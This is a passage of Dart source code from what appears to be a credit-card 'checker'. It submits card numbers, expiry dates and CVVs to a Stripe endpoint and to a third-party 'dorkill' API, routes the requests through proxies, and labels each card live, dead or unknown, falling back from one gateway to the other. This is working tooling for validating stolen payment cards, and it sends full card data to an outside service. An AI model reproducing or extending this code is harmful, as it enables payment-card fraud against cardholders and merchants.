                      },
                    )
                    .timeout(Duration(seconds: cfg.timeoutSec));
                sw.stop();

                final j = jsonDecode(r.body) as Map<String, dynamic>;

                if (r.statusCode == 200 && j['id'] != null) {
                  return CheckResult(status: CheckStatus.live, message: 'aprobada', gateway: 'stripe', latencyMs: sw.elapsedMilliseconds);
                }

                final err = (j['error'] as Map?) ?? const {};
                final code = (err['code'] ?? '').toString();
                final decline = (err['decline_code'] ?? '').toString();
                final msg = (err['message'] ?? 'rechazada').toString();

                if (code == 'card_declined') {
                  return CheckResult(status: CheckStatus.dead, message: decline.isEmpty ? 'declinada' : decline, gateway: 'stripe', latencyMs: sw.elapsedMilliseconds);
                }
                if (code == 'incorrect_number' || code == 'invalid_number') {
                  return CheckResult(status: CheckStatus.dead, message: 'numero invalido', gateway: 'stripe', latencyMs: sw.elapsedMilliseconds);
                }
                if (code == 'expired_card') {
                  return CheckResult(status: CheckStatus.dead, message: 'vencida', gateway: 'stripe', latencyMs: sw.elapsedMilliseconds);
                }
                if (code == 'incorrect_cvc') {
                  return CheckResult(status: CheckStatus.dead, message: 'cvv incorrecto', gateway: 'stripe', latencyMs: sw.elapsedMilliseconds);
                }
                return CheckResult(status: CheckStatus.unknown, message: msg, gateway: 'stripe', latencyMs: sw.elapsedMilliseconds);
              } catch (_) {
                sw.stop();
                return CheckResult(status: CheckStatus.unknown, message: 'red', gateway: 'stripe', latencyMs: sw.elapsedMilliseconds);
              }
            }

            Future<CheckResult> _dorkill(CreditCard card, ProxyNode? p) async {
              if (cfg.dorkillKey.isEmpty) {
                return const CheckResult(status: CheckStatus.unknown, message: 'falta API key', gateway: 'dorkill');
              }

              final sw = Stopwatch()..start();
              try {
                final uri = Uri.parse(dorkillUrl).replace(queryParameters: {
                  'card': '${card.pan}|${card.expLabel}|${card.cvv}',
                  'key': cfg.dorkillKey,
                });
                final r = await _client(p).get(uri).timeout(Duration(seconds: cfg.timeoutSec));
                sw.stop();

                final text = r.body.toLowerCase();
                if (text.contains('"live"') || text.contains('approved') || text.contains('"charged":true')) {
                  return CheckResult(status: CheckStatus.live, message: 'aprobada', gateway: 'dorkill', latencyMs: sw.elapsedMilliseconds);
                }
                if (text.contains('declined') || text.contains('"status":"fail"') || text.contains('invalid')) {
                  return CheckResult(status: CheckStatus.dead, message: 'declinada', gateway: 'dorkill', latencyMs: sw.elapsedMilliseconds);
                }
                return CheckResult(
                  status: CheckStatus.unknown,
                  message: text.length > 60 ? text.substring(0, 60) : text,
                  gateway: 'dorkill',
                  latencyMs: sw.elapsedMilliseconds,
                );
              } catch (_) {
                sw.stop();
                return CheckResult(status: CheckStatus.unknown, message: 'red', gateway: 'dorkill', latencyMs: sw.elapsedMilliseconds);
              }
            }

            Future<CheckResult> _cascade(CreditCard card, ProxyNode? p) async {
              final a = await _stripe(card, p);
              if (a.status == CheckStatus.live) return a;

              final b = await _dorkill(card, p);
              if (b.status == CheckStatus.live) return b;

              if (a.status == CheckStatus.dead && b.status == CheckStatus.dead) {
                return CheckResult(status: CheckStatus.dead, message: '${a.message} + ${b.message}', gateway: 'cascada', latencyMs: a.latencyMs + b.latencyMs);
              }
              if (a.status == CheckStatus.dead) return a;
              if (b.status == CheckStatus.dead) return b;
              return const CheckResult(status: CheckStatus.unknown, message: 'sin respuesta', gateway: 'cascada');
            }
          }
